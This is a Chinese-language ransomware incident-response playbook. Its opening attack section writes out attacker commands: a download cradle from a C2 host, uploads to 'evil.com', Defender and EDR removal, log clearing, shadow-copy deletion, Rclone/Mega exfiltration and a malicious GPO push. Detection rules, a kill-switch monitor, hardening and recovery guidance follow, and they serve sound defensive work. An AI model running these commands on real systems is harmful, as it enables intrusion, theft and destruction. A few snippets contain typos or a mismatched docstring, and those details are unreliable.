---
name: ir-ransomware-response
description: >
  勒索软件事件完整响应手册：覆盖从勒索软件攻击检测、遏制、根除、恢复到事后分析的完整 IR 流程，
  包含 CISA 框架 playbook、桌面演练、恢复验证、canary 文件部署、kill-switch 检测、
  Group Policy 防护策略、备份策略实施，以及加密机制逆向分析和解密密钥恢复技术。
domain: cybersecurity
subdomain: incident-response
tags: [ransomware, incident-response, recovery, cisa, backup, encryption, tabletop, canary, kill-switch, group-policy]
version: 2.0.0
---

# 勒索软件事件响应 — 完整攻防手册

## 适用场景

- 组织遭受勒索软件攻击，需要完整的检测-遏制-恢复流程
- 需要构建勒索软件防御体系（备份策略、GPO 防护、canary 部署）
- 准备勒索软件桌面演练或验证恢复能力
- 逆向分析勒索软件加密机制，评估数据恢复可能性

**不适用于**：纯 DDoS 攻击、无加密的数据泄露、非勒索软件类型的恶意软件事件。

## 前置条件

- EDR/SIEM 平台（CrowdStrike/SentinelOne/Splunk/ELK）
- 网络隔离能力（交换机端口关闭、VLAN 隔离）
- 备份基础设施（Veeam/Commvault/云备份）
- 取证工具（Velociraptor/KAPE/FLARE VM）
- 域管理员权限（用于 GPO 部署和 AD 遏制）

---

## Part A：攻击方法论

### 1. 勒索软件攻击链分析

#### 1.1 完整攻击链

```
初始访问 → 发现/侦察 → 权限提升 → 横向移动 → 数据窃取 → 加密部署 → 勒索通知 → 双重勒索
```

| 阶段 | 攻击者行为 | 常见技术 |
|------|-----------|---------|
| 初始访问 | 钓鱼邮件、漏洞利用、购买初始访问 | T1566/T1190/T1133 |
| 发现/侦察 | AD 枚举、网络扫描、数据定位 | T1087/T1018/T1083 |
| 权限提升 | 凭据窃取、Kerberoasting、Pass-the-Hash | T1003/T1558/T1550 |
| 横向移动 | PsExec、WMI、RDP、SMB | T1021/T1047/T1570 |
| 数据窃取 | Rclone、Mega、ExMatter、云存储 | T1567/T1048 |
| 加密部署 | 批量部署、计划任务、GPO 推送 | T1059/T1053 |
| 勒索通知 | 桌面壁纸、README 文件、弹窗 | — |
| 双重勒索 | DLS 泄露网站、客户通知威胁 | — |

#### 1.2 主流勒索软件家族 TTP 差异

| 家族 | RaaS | 初始访问偏好 | 加密算法 | 横向移动 | 数据窃取 | 特征 |
|------|------|-------------|---------|---------|---------|------|
| LockBit 3.0 | 是 | RDP/漏洞 | AES-256 + RSA | PsExec/LAPS | StealBit | 自动化程度高，speed |
| BlackCat/ALPHV | 是 | 漏洞/钓鱼 | ChaCha20 + RSA | WMI/PSExec | Rclone | Rust 编写，跨平台 |
| Cl0p | 是 | MoveIT/零日 | AES + RSA | — | 直接窃取 | 供应链攻击为主 |
| Royal/BlackSuit | 是 | RDP/钓鱼 | AES + RSA | PsExec | Rclone | 部分不加密小文件 |
| Play | 否 | 漏洞 | AES + RSA | PsExec/WMI | 自定义工具 | 不留 ransom note |
| Akira | 是 | VPN 漏洞 | AES + RSA | RDP/LAPS | Rclone | Linux/VMware ESXi |
| Rhysida | 是 | 漏洞/钓鱼 | AES-256 + RSA | PsExec | PsExec 传输 | "Rhysida-0.1" 标识 |

### 2. 加密机制分析

#### 2.1 混合加密流程

```
1. 每个文件生成随机 AES-256 会话密钥
2. 使用 AES（CBC/CTR 模式）加密文件内容
3. 使用硬编码 RSA 公钥加密 AES 会话密钥
4. 将加密后的会话密钥附加到文件头部/尾部
5. 修改文件扩展名
6. 删除原始文件的卷影副本
7. RSA 私钥由攻击者保管，用于"解密服务"
```

#### 2.2 部分加密（间歇性加密）

```python
# 典型间歇性加密模式
# 只加密文件的部分内容以加速加密过程
CHUNK_SIZE = 0x100000  # 1MB
ENCRYPT_RATIO = 0.12   # 只加密 12% 的数据

def intermittent_encrypt(file_path, key):
    with open(file_path, 'rb+') as f:
        file_size = os.path.getsize(file_path)
        offset = 0
        while offset < file_size:
            bytes_to_encrypt = int(CHUNK_SIZE * ENCRYPT_RATIO)
            f.seek(offset)
            data = f.read(bytes_to_encrypt)
            encrypted = aes_encrypt(data, key)
            f.seek(offset)
            f.write(encrypted)
            offset += CHUNK_SIZE
```

#### 2.3 已知可恢复场景

| 场景 | 原因 | 恢复方法 |
|------|------|---------|
| 密钥管理缺陷 | 部分旧版本使用硬编码密钥 | 逆向提取密钥直接解密 |
| 间歇性加密 | 只加密了部分数据 | 使用磁盘取证恢复未加密扇区 |
| 加密前文件残留 | NTFS $MFT/日志中有残留 | NTFS 日志解析恢复 |
| Kill-switch 触发 | 未完成全部加密即退出 | 部分文件未受影响 |
| 卷影副本残留 | vssadmin 删除失败 | VSS 恢复 |
| 备份服务器未受影响 | 横向移动未到达 | 从备份恢复 |
| 已有解密工具 | EuROPOL/NoMoreRansom 发布 | 使用官方解密工具 |

### 3. 攻击工具与命令

#### 3.1 初始访问工具

```powershell
# Cobalt Strike beacon 内存加载（常见载荷格式）
# 通过 PowerShell 一句话加载
IEX (New-Object Net.WebClient).DownloadString('http://c2server/payload.ps1')

# ScreenConnect 滥用（合法远控工具被用于初始访问）
# 攻击者使用被盗凭据登录 ScreenConnect 实例

# 漏洞利用常见入口
# - Citrix Bleed (CVE-2023-4966)
# - ProxyShell/ProxyLogon (Exchange)
# - MOVEit Transfer (CVE-2023-34362)
# - FortiOS (CVE-2024-21762)
# - ConnectWise ScreenConnect (CVE-2024-1709)
```

#### 3.2 禁用安全工具命令

```powershell
# 禁用 Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath "C:\"

# 卸载安全软件（需管理员权限）
wmic product where "name like '%CrowdStrike%'" call uninstall /nointeractive
wmic product where "name like '%Sentinel%'" call uninstall /nointeractive

# 禁用 Windows Firewall
netsh advfirewall set allprofiles state off

# 清除事件日志
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# 禁用 Windows Event Log 服务
sc config eventlog start=disabled
sc stop eventlog
```

#### 3.3 卷影副本删除

```powershell
# 方法 1: vssadmin
vssadmin delete shadows /all /quiet

# 方法 2: wmic
wmic shadowcopy delete /nointeractive

# 方法 3: PowerShell
Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }

# 方法 4: diskshadow（高级）
diskshadow /s script.txt
# script.txt 内容:
# delete shadows all
# exit

# 方法 5: 通过 COM 对象（隐蔽）
$shadow = New-Object -ComObject MSScriptControl.ScriptControl
# (C# 内联方式调用 VSS API)
```

#### 3.4 数据外泄工具

```bash
# Rclone（最常见的数据外泄工具）
rclone copy "C:\sensitive_data" remote:bucket_name --transfers 4 --progress

# MegaCMD
mega-login user@email.com password
mega-put "C:\stolen_data" /stolen/

# ExMatter (Cl0p 专用)
# 自定义 .NET 数据外泄工具，通过 FTP/SFTP 传输

# PowerShell 上传（简单场景）
Invoke-WebRequest -Uri "https://evil.com/upload" -Method POST -InFile "data.zip"
```

### 4. 绕过技术

#### 4.1 Living-off-the-Land 二进制利用

```
# 常用 LolBin 用于勒索软件部署
certutil.exe -urlcache -split -f http://c2/payload.exe C:\temp\payload.exe
bitsadmin.exe /transfer job http://c2/payload.exe C:\temp\payload.exe
mshta.exe http://c2/payload.hta
msiexec.exe /i http://c2/payload.msi /quiet
rundll32.exe payload.dll,EntryPoint
```

#### 4.2 安全模式加密

```batch
# 强制进入安全模式后加密（绕过安全软件）
bcdedit /set {default} safeboot minimal
shutdown /r /t 0

# 加密完成后恢复正常启动
bcdedit /deletevalue {default} safeboot
shutdown /r /t 0
```

#### 4.3 域策略组推送加密

```powershell
# 通过 GPO 推送勒索软件到所有域成员（高级）
# 攻击者创建恶意 GPO 并链接到 OU
New-GPO -Name "SoftwareUpdate" | New-GPLink -Target "OU=Workstations,DC=domain,DC=com"
# 设置计划任务立即执行
Set-GPPrefGroupPolicy -Name "SoftwareUpdate" -Action Create -GPOType ScheduledTask `
  -TaskName "WindowsUpdate" -Command "cmd.exe" -Arguments "/c \\share\payload.exe"
```

---

## Part B：检测与防御

### 5. 检测规则

#### 5.1 Sigma 规则 — 卷影副本删除

```yaml
title: Volume Shadow Copy Deletion
id: c7751818-4a20-4a8e-8199-61f91b3de6f4
status: stable
level: critical
description: 检测卷影副本删除行为（勒索软件典型指标）
author: security-team
date: 2024/01/01
tags:
  - attack.defense_evasion
  - attack.t1490
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    CommandLine|contains:
      - 'vssadmin delete shadows'
      - 'wmic shadowcopy delete'
      - 'diskshadow delete shadows'
      - 'vssadmin resize shadowstorage'
  condition: selection
falsepositives:
  - 合法备份维护操作
```

#### 5.2 Sigma 规则 — 批量文件操作

```yaml
title: Mass File Encryption Indicators
id: a8b7c6d5-4e3f-4a2b-1c0d-9e8f7a6b5c4d
status: stable
level: high
description: 检测短时间内大量文件修改/重命名行为
author: security-team
date: 2024/01/01
tags:
  - attack.impact
  - attack.t1486
logsource:
  category: file_event
  product: windows
detection:
  selection:
    TargetFilename|endswith:
      - '.encrypted'
      - '.locked'
      - '.crypto'
      - '.cry'
      - '.enc'
      - '.lockbit'
      - '.blackcat'
      - '.royal'
      - '.play'
      - '.akira'
      - '.rhysida'
      - '.clop'
  timeframe: 5m
  condition: selection | count() > 100
falsepositives:
  - 合法批量文件操作
```

#### 5.3 Sigma 规则 — 安全工具禁用

```yaml
title: Security Tool Disabling
id: b2c3d4e5-6f7a-8b9c-0d1e-2f3a4b5c6d7e
status: stable
level: critical
description: 检测禁用安全软件的行为
author: security-team
date: 2024/01/01
tags:
  - attack.defense_evasion
  - attack.t1562
logsource:
  category: process_creation
  product: windows
detection:
  selection_cmd:
    CommandLine|contains:
      - 'Set-MpPreference -DisableRealtimeMonitoring'
      - 'Add-MpPreference -ExclusionPath'
      - 'netsh advfirewall set allprofiles state off'
      - 'sc stop windefend'
      - 'sc config windefend start=disabled'
  selection_uninstall:
    CommandLine|contains:
      - 'wmic product'
      - 'call uninstall'
    CommandLine|contains_any:
      - 'CrowdStrike'
      - 'Sentinel'
      - 'CarbonBlack'
      - 'Cortex'
      - 'Defender'
  condition: selection_cmd or selection_uninstall
falsepositives:
  - 安全管理员合法操作
```

#### 5.4 YARA 规则 — 勒索软件家族特征

```yara
rule LockBit_Ransomware {
    meta:
        description = "LockBit 3.0 Ransomware Detection"
        author = "security-team"
        date = "2024-01-01"
        hash = "sample_hash_here"
    strings:
        $s1 = "lockbit" ascii nocase wide
        $s2 = "LockBit 3.0" ascii wide
        $s3 = ".lockbit" ascii wide
        $s4 = "APPDATA" ascii wide
        $api1 = "VirtualAlloc" ascii
        $api2 = "CreateFileW" ascii
        $api3 = "CryptEncrypt" ascii
        $enc1 = { 48 8B ?? E8 ?? ?? ?? ?? 48 85 C0 74 }  // AES-NI 加密序列
    condition:
        uint16(0) == 0x5A4D and
        ($s1 or $s2 or $s3) and
        2 of ($api*) and
        filesize < 10MB
}

rule BlackCat_ALPHV {
    meta:
        description = "BlackCat/ALPHV Ransomware Detection (Rust)"
        author = "security-team"
        date = "2024-01-01"
    strings:
        $s1 = "blackcat" ascii nocase wide
        $s2 = "alphv" ascii nocase wide
        $s3 = ".blackcat" ascii wide
        $rust1 = "rust_begin_unwind" ascii
        $rust2 = "rust_panic" ascii
        $enc1 = { 48 8D ?? E8 ?? ?? ?? ?? 48 89 ?? 48 8B ?? }  // ChaCha20 序列
    condition:
        ($s1 or $s2 or $s3) and
        ($rust1 or $rust2) and
        filesize < 15MB
}

rule Ransomware_Generic_Encryption {
    meta:
        description = "通用勒索软件加密行为特征"
        author = "security-team"
        date = "2024-01-01"
    strings:
        $api1 = "CryptEncrypt" ascii
        $api2 = "CryptGenKey" ascii
        $api3 = "BCryptEncrypt" ascii
        $vss1 = "vssadmin" ascii nocase
        $vss2 = "shadowcopy" ascii nocase
        $vss3 = "delete shadows" ascii nocase
        $ext1 = ".encrypted" ascii nocase wide
        $ext2 = ".locked" ascii nocase wide
        $readme = "README" ascii wide
    condition:
        uint16(0) == 0x5A4D and
        (1 of ($api*) or 1 of ($vss*)) and
        1 of ($ext*) and
        filesize < 20MB
}
```

#### 5.5 Sysmon 检测配置

```xml
<Sysmon schemaversion="4.50">
  <!-- 检测卷影副本删除 -->
  <RuleGroup name="VSSDeletion" groupRelation="or">
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">vssadmin delete shadows</CommandLine>
      <CommandLine condition="contains">wmic shadowcopy delete</CommandLine>
      <CommandLine condition="contains">diskshadow delete shadows</CommandLine>
    </ProcessCreate>
  </RuleGroup>

  <!-- 检测安全工具禁用 -->
  <RuleGroup name="SecurityToolDisabling" groupRelation="or">
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">Set-MpPreference -DisableRealtimeMonitoring</CommandLine>
      <CommandLine condition="contains">sc stop windefend</CommandLine>
      <CommandLine condition="contains">netsh advfirewall set allprofiles state off</CommandLine>
    </ProcessCreate>
  </RuleGroup>

  <!-- 检测批量文件加密 -->
  <RuleGroup name="MassEncryption" groupRelation="or">
    <FileCreate onmatch="include">
      <TargetFilename condition="end with">.encrypted</TargetFilename>
      <TargetFilename condition="end with">.locked</TargetFilename>
      <TargetFilename condition="end with">.lockbit</TargetFilename>
      <TargetFilename condition="end with">.blackcat</TargetFilename>
    </FileCreate>
  </RuleGroup>
</Sysmon>
```

### 6. Kill-Switch 检测与实施

#### 6.1 Kill-Switch 机制分析

```
勒索软件 Kill-Switch 类型：
1. 域名检查 — 解析特定域名，成功则退出（如 WannaCry 的 iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com）
2. IP 检查 — 连接特定 IP 获取退出指令
3. 日期/时间 — 超过特定日期停止加密
4. 键盘布局 — 检测特定语言/地区布局则跳过（如俄语键盘）
5. 注册表检查 — 特定注册表键值存在则退出
6. 进程检查 — 检测沙箱/分析工具进程则退出
```

#### 6.2 Kill-Switch 监控脚本

```python
#!/usr/bin/env python3
"""
勒索软件 Kill-Switch 域名监控器
注册已知勒索软件的 kill-switch 域名，解析到 sinkhole 以阻止加密
"""
import dns.resolver
import time
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# 已知勒索软件 kill-switch 域名
KILLSWITCH_DOMAINS = {
    # WannaCry
    "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com": "WannaCry",
    "ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.com": "WannaCry",
    # Petya/NotPetya
    "wowsmith123456728.su": "NotPetya",
    # 其他
    "ayylmaotjhsstjhtjin.com": "TeslaCrypt",
    "vffjgfvqwgsgg463fd.top": "Cerber",
}

def monitor_killswitches(interval=300):
    """定期检查 kill-switch 域名是否被注册"""
    logging.info("Starting kill-switch monitor...")
    while True:
        for domain, family in KILLSWITCH_DOMAINS.items():
            try:
                answers = dns.resolver.resolve(domain, 'A')
                ips = [rdata.address for rdata in answers]
                logging.warning(f"KILLSWITCH ACTIVE: {domain} ({family}) resolves to {ips}")
            except dns.resolver.NXDOMAIN:
                logging.debug(f"Domain not registered (safe): {domain}")
            except dns.resolver.Timeout:
                logging.debug(f"Timeout checking: {domain}")
            except Exception as e:
                logging.error(f"Error checking {domain}: {e}")
        time.sleep(interval)

if __name__ == "__main__":
    monitor_killswitches()
```

#### 6.3 DNS Sinkhole 配置（阻止加密）

```bash
# BIND DNS 配置 — 将 kill-switch 域名解析到 sinkhole
# 在 /etc/named.conf 中添加：
zone "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com" {
    type master;
    file "/etc/named/zones/sinkhole.db";
};

# sinkhole.db 内容：
$TTL 300
@   IN  SOA  ns1.local. admin.local. (
        2024010101 3600 600 86400 300 )
    IN  NS   ns1.local.
@   IN  A    127.0.0.1    ; sinkhole response
*   IN  A    127.0.0.1    ; catch all subdomains
```

### 7. Group Policy 防护策略

#### 7.1 AppLocker/WDAC 应用白名单

```powershell
# AppLocker 配置 — 仅允许合法可执行文件运行
# 通过 GPO 推送：Computer Configuration > Policies > Windows Settings > Security Settings >
# Application Control Policies > AppLocker

# 创建 AppLocker 规则（PowerShell）
# 允许 Windows 系统目录
New-AppLockerPolicy -RuleType Path,Publisher -Path "C:\Windows\*" `
  -User Everyone -Xml | Set-AppLockerPolicy -Merge

# 阻止从 %TEMP% 和 %APPDATA% 执行
# 大多数勒索软件从这些目录启动
$policy = @"
<RuleCollection Type="Exe" EnforcementMode="Enabled">
  <FilePathRule Id="a9e7a9a0-1b2c-3d4e-5f6a-7b8c9d0e1f2a"
    Name="Block TEMP execution"
    Description="Block executables from temp directories"
    UserOrGroupSid="S-1-1-0" Action="Deny">
    <Conditions>
      <FilePathCondition Path="%TEMP%\*" />
    </Conditions>
  </FilePathRule>
  <FilePathRule Id="b0f1a2b3-c4d5-e6f7-a8b9-c0d1e2f3a4b5"
    Name="Block APPDATA execution"
    Description="Block executables from AppData"
    UserOrGroupSid="S-1-1-0" Action="Deny">
    <Conditions>
      <FilePathCondition Path="%APPDATA%\*" />
    </Conditions>
  </FilePathRule>
</RuleCollection>
"@
```

#### 7.2 文件扩展名阻止列表

```powersheel
# GPO: Computer Configuration > Administrative Templates > Windows Components >
# Windows Defender Antivirus > MAPS > Configure local setting override for reporting to Microsoft MAPS

# 通过注册表阻止特定扩展名文件被修改（监控模式）
$monitorExtensions = @(
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".pdf", ".mdb", ".accdb", ".pst", ".ost",
    ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".psd",
    ".zip", ".rar", ".7z", ".tar", ".gz",
    ".sql", ".mdf", ".ldf", ".bak",
    ".vmdk", ".vhd", ".vhdx"
)

# 配置 Windows Defender 攻击面减少规则
# 阻止勒索软件行为
Set-MpPreference -AttackSurfaceReductionRules_Ids @(
    "c1db55ab-c21a-4637-bb3f-a8683d4d409a"  # 阻止来自邮件/Office 的可执行内容
    "9e86e830-3b53-4e15-8f0e-6a6c68ee5e98"  # 阻止可执行文件运行，除非满足流行率/年龄条件
    "d1e49aac-8f56-4280-b9ba-7a3a1d6a3d4e"  # 阻止通过 WMI 订阅创建进程
    "be9ba2d9-53ea-4cd6-a003-5a79e5c2b3a8"  # 阻止 Office 应用创建可执行内容
    "b2b3f03d-6a65-4f7b-a9c7-77691d049e04"  # 阻止 Office 应用注入进程
    "33dded24-0d02-4979-95fd-65d1e80e4a50   # 阻止从 USB 运行的不受信任/未签名进程
) -AttackSurfaceReductionRules_Actions @("AuditMode")
```

#### 7.3 PowerShell 约束模式

```powershell
# GPO: Computer Configuration > Administrative Templates > Windows Components >
# Windows PowerShell > Turn on PowerShell Script Block Logging

# 启用 PowerShell 约束语言模式
# 通过 GPO 或注册表
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" `
  -Name "__PSLockdownPolicy" -Value 4

# 启用 PowerShell 脚本块日志
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
  -Name "EnableScriptBlockLogging" -Value 1
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
  -Name "EnableScriptBlockInvocationLogging" -Value 1
```

#### 7.4 注册表防护

```powershell
# 保护 MBR 和启动配置
# 阻止非授权进程修改关键注册表键
$acl = Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem"
$rule = New-Object System.Security.AccessControl.RegistryAccessRule(
    "BUILTIN\Administrators", "FullControl", "ContainerInherit,ObjectInherit",
    "None", "Allow"
)
$acl.SetAccessRule($rule)
Set-Acl "HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem" $acl

# 禁用 WMI 远程访问（减少横向移动）
# GPO: Computer Configuration > Windows Settings > Security Settings >
# Windows Firewall with Advanced Security > Inbound Rules
# 阻止 TCP 135 (RPC) 和 TCP 5985/5986 (WinRM) 入站
```

### 8. 备份策略

#### 8.1 3-2-1 备份规则实施

```
3-2-1 规则：
  3 份数据副本（生产 + 2 个备份）
  2 种不同存储介质（磁盘 + 磁带/云）
  1 份离线/异地备份

增强版 3-2-1-1-0：
  3 份数据副本
  2 种不同存储介质
  1 份离线/异地备份
  1 份不可变备份（Immutable/Air-gapped）
  0 错误（所有备份验证通过）
```

#### 8.2 不可变备份配置

```bash
# AWS S3 Object Lock（不可变备份）
aws s3api put-object-lock-configuration --bucket backup-bucket \
  --object-lock-configuration '{
    "ObjectLockEnabled": "Enabled",
    "Rule": {
      "DefaultRetention": {
        "Mode": "COMPLIANCE",
        "Days": 365
      }
    }
  }'

# 上传不可变备份对象
aws s3api put-object --bucket backup-bucket --key "backup-$(date +%Y%m%d).zip" \
  --body /data/backup.zip \
  --object-lock-mode COMPLIANCE \
  --object-lock-retain-until-date "$(date -d '+365 days' -u +%Y-%m-%dT%H:%M:%SZ)"

# Azure Blob 不可变存储
az storage account blob-service-properties update \
  --account-name storageaccount \
  --enable-immutable-storage true

# Veeam 不可变备份（Linux Hardened Repository）
# 使用 chattr +i 设置不可变属性
chattr +i /backup/repository/immutable_backup.vbk
```

#### 8.3 备份验证自动化脚本

```python
#!/usr/bin/env python3
"""
备份完整性验证脚本
- 验证备份文件存在且大小合理
- 验证备份可成功恢复（测试恢复）
- 验证不可变备份状态
"""
import os
import subprocess
import json
import logging
from datetime import datetime, timedelta

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

BACKUP_CONFIG = {
    "backup_paths": [
        "/backup/daily/",
        "/backup/weekly/",
        "/backup/monthly/"
    ],
    "min_size_mb": 100,          # 备份文件最小大小（MB）
    "max_age_hours": 48,         # 备份最大年龄（小时）
    "test_restore_path": "/tmp/restore_test/",
    "veeam_server": "veeam.company.com",
    "immutable_check": True
}

def verify_backup_exists(path, min_size_mb, max_age_hours):
    """验证备份文件存在、大小合理、年龄合规"""
    results = []
    if not os.path.exists(path):
        return [{"status": "FAIL", "message": f"Backup path not found: {path}"}]

    now = datetime.now()
    for f in os.listdir(path):
        filepath = os.path.join(path, f)
        if not os.path.isfile(filepath):
            continue

        size_mb = os.path.getsize(filepath) / (1024 * 1024)
        mtime = datetime.fromtimestamp(os.path.getmtime(filepath))
        age_hours = (now - mtime).total_seconds() / 3600

        if size_mb < min_size_mb:
            results.append({"status": "WARN", "message": f"{f}: size {size_mb:.1f}MB < min {min_size_mb}MB"})
        elif age_hours > max_age_hours:
            results.append({"status": "FAIL", "message": f"{f}: age {age_hours:.1f}h > max {max_age_hours}h"})
        else:
            results.append({"status": "PASS", "message": f"{f}: {size_mb:.1f}MB, {age_hours:.1f}h old"})

    return results

def run_verification():
    """执行完整备份验证"""
    all_results = []
    for path in BACKUP_CONFIG["backup_paths"]:
        results = verify_backup_exists(
            path,
            BACKUP_CONFIG["min_size_mb"],
            BACKUP_CONFIG["max_age_hours"]
        )
        all_results.extend(results)

    for r in all_results:
        if r["status"] == "PASS":
            logging.info(f"[PASS] {r['message']}")
        elif r["status"] == "WARN":
            logging.warning(f"[WARN] {r['message']}")
        else:
            logging.error(f"[FAIL] {r['message']}")

    failed = sum(1 for r in all_results if r["status"] == "FAIL")
    if failed > 0:
        logging.critical(f"Backup verification FAILED: {failed} issues found!")
        return False
    logging.info("Backup verification PASSED")
    return True

if __name__ == "__main__":
    run_verification()
```

### 9. CISA 框架 Playbook

#### 9.1 完整 IR 六阶段流程

```
┌─────────────────────────────────────────────────────────┐
│              CISA 勒索软件事件响应 Playbook               │
├─────────────────────────────────────────────────────────┤
│ Phase 1: PREPARE    │ 预先部署防御、备份、演练          │
│ Phase 2: DETECT     │ 检测加密行为、C2 通信             │
│ Phase 3: CONTAIN    │ 网络隔离、凭据重置、遏制扩散      │
│ Phase 4: ERADICATE  │ 清除恶意软件、后门、持久化        │
│ Phase 5: RECOVER    │ 从备份恢复、验证完整性            │
│ Phase 6: POST-IR    │ 经验教训、改进计划                │
└─────────────────────────────────────────────────────────┘
```

#### 9.2 Phase 3: 遏制 — 网络隔离命令

```bash
# === Windows 防火墙隔离 ===
# 阻止所有入站/出站流量，只允许 IR 团队 IP
netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound

# 允许 IR 团队 IP（替换为实际 IP）
netsh advfirewall firewall add rule name="IR Team Access" dir=in action=allow remoteip=10.0.0.100/32
netsh advfirewall firewall add rule name="IR Team Access Out" dir=out action=allow remoteip=10.0.0.100/32

# === 交换机端口关闭 ===
# Cisco IOS
interface GigabitEthernet1/0/15
  shutdown
  description QUARANTINED-RANSOMWARE

# === VLAN 隔离 ===
# 将受感染主机移到隔离 VLAN
# Cisco IOS
interface GigabitEthernet1/0/15
  switchport access vlan 999
  description QUARANTINE-VLAN

# === Active Directory 遏制 ===
# 禁用受感染计算机账户
Set-ADComputer -Identity "WORKSTATION-01" -Enabled $false

# 重置 krbtgt 账户密码（两次，间隔 >12h）
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "NewP@ss123!" -Force)

# 强制所有用户下次登录修改密码
Get-ADUser -Filter * -SearchBase "OU=Users,DC=domain,DC=com" | `
  Set-ADUser -ChangePasswordAtLogon $true
```

#### 9.3 Phase 5: 恢复 — 恢复优先级矩阵

```
恢复优先级矩阵（关键性 × 可恢复性）：

              │ 可立即恢复 │ 需 24h 恢复 │ 需 >24h │ 不可恢复
──────────────┼────────────┼─────────────┼─────────┼─────────
  P0 核心业务 │   R1 立即   │   R1 立即   │  R1 立即 │  R2 优先
  P1 重要业务 │   R1 立即   │   R2 优先   │  R2 优先 │  R3 计划
  P2 支持系统 │   R2 优先   │   R3 计划   │  R3 计划 │  R4 延后
  P3 非关键   │   R3 计划   │   R4 延后   │  R4 延后 │  R4 延后

R1 = 第一批恢复（<4h）
R2 = 第二批恢复（<24h）
R3 = 第三批恢复（<72h）
R4 = 延后恢复（>72h）
```

### 10. 桌面演练方案

#### 10.1 场景设计模板

| 级别 | 场景名称 | 复杂度 | 描述 | 预计时长 |
|------|---------|--------|------|---------|
| L1 | 单机加密 | 低 | 一台工作站被勒索软件加密，无横向移动 | 1h |
| L2 | 部门感染 | 中 | 一个部门多台机器被加密，有初步横向移动 | 2h |
| L3 | 企业级爆发 | 高 | 整个 AD 域被攻陷，GPO 推送加密 | 3h |
| L4 | 双重勒索 | 高 | 数据被窃取+加密，攻击者威胁公开 | 3h |
| L5 | 供应链攻击 | 极高 | 通过第三方软件更新感染全公司 | 4h |

#### 10.2 L3 场景脚本示例

```
T+0min   — SOC 收到终端告警：工作站在 60s 内修改 >500 个文件
T+5min   — EDR 控制台显示加密进程：svchost_evil.exe（伪装系统进程）
T+10min  — 第二台、第三台工作站出现相同行为
T+15min  — AD 日志显示攻击者使用域管理员凭据通过 PsExec 横向移动
T+20min  — 文件服务器共享目录被发现正在被加密
T+30min  — 攻击者已通过 Rclone 将 50GB 数据外泄至 Mega 云存储
T+45min  — 所有工作站桌面出现勒索信，要求支付 500 BTC

讨论要点：
1. T+0 时你如何判断这是勒索软件而非误报？
2. T+10 时遏制策略是什么？（断网？隔离？）
3. T+15 时如何阻止横向移动？
4. T+30 时如何保护备份服务器？
5. 整体恢复优先级如何排列？
```

#### 10.3 评估指标

| 指标 | 目标值 | 说明 |
|------|--------|------|
| 检测时间 (TTD) | <15 min | 从加密开始到 SOC 告警 |
| 遏制时间 (TTC) | <30 min | 从告警到有效遏制扩散 |
| 恢复时间 (TTR) | <48 h | 从遏制完成到核心业务恢复 |
| 沟通质量 | — | 内部/外部/法律沟通是否及时准确 |
| 决策质量 | — | 关键决策点是否正确 |
| 文档完整性 | — | 是否完整记录所有行动和时间线 |

### 11. 恢复验证

#### 11.1 恢复测试检查清单

```markdown
## 恢复验证检查清单

### 基础设施恢复
- [ ] AD 域控制器恢复正常，所有服务运行
- [ ] DNS/DHCP 服务恢复
- [ ] 网络设备配置恢复
- [ ] 防火墙规则验证

### 应用恢复
- [ ] 核心业务应用启动并正常运行
- [ ] 数据库完整性验证通过
- [ ] 文件服务恢复，共享权限正确
- [ ] 邮件系统恢复，队列清空

### 数据完整性
- [ ] 数据库记录数与备份一致
- [ ] 文件哈希值与备份比对通过
- [ ] 关键业务数据抽样验证
- [ ] 日志数据完整恢复

### 安全验证
- [ ] 所有系统已安装最新补丁
- [ ] EDR 代理已重新部署并正常运行
- [ ] 受感染系统已完全重装
- [ ] 所有凭据已重置
- [ ] 后门/持久化已完全清除

### 性能验证
- [ ] 系统性能指标恢复正常
- [ ] 网络流量模式正常
- [ ] 用户可正常访问所有服务
```

#### 11.2 数据完整性验证脚本

```bash
#!/bin/bash
# 恢复数据完整性验证
# 比较恢复数据与备份的哈希值

BACKUP_DIR="/backup/verified/"
RESTORE_DIR="/data/restored/"
REPORT_FILE="/tmp/integrity_report_$(date +%Y%m%d_%H%M%S).txt"

echo "=== Data Integrity Verification ===" > "$REPORT_FILE"
echo "Started: $(date)" >> "$REPORT_FILE"

# 对比关键文件的 SHA256
find "$RESTORE_DIR" -type f -name "*.xlsx" -o -name "*.docx" -o -name "*.pdf" | while read -r file; do
    relative_path="${file#$RESTORE_DIR}"
    backup_file="${BACKUP_DIR}${relative_path}"

    if [ -f "$backup_file" ]; then
        restore_hash=$(sha256sum "$file" | awk '{print $1}')
        backup_hash=$(sha256sum "$backup_file" | awk '{print $1}')

        if [ "$restore_hash" = "$backup_hash" ]; then
            echo "[PASS] $relative_path" >> "$REPORT_FILE"
        else
            echo "[FAIL] $relative_path - Hash mismatch!" >> "$REPORT_FILE"
        fi
    else
        echo "[WARN] $relative_path - No backup reference" >> "$REPORT_FILE"
    fi
done

echo "Completed: $(date)" >> "$REPORT_FILE"
echo "Report saved to: $REPORT_FILE"

# 统计结果
passed=$(grep -c "PASS" "$REPORT_FILE")
failed=$(grep -c "FAIL" "$REPORT_FILE")
warned=$(grep -c "WARN" "$REPORT_FILE")
